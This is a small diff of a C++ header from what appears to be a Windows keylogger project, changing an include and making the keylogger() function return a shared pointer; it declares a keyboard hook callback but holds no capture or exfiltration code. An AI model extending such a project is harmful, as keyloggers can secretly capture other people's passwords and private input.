@@ -1,5 +1,5 @@
 #pragma once
-#include "DataObj/KLG_Obj.h"
+#include "DataObj/DataObj.h"
 #include <memory>
 #include <conio.h>
 #include <windows.h>
@@ -12,7 +12,7 @@ class KLG_Func
 public:
 	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-	DataObj* keylogger();
+	std::shared_ptr<DataObj> keylogger();
 
 	bool checkStopSignal();
 
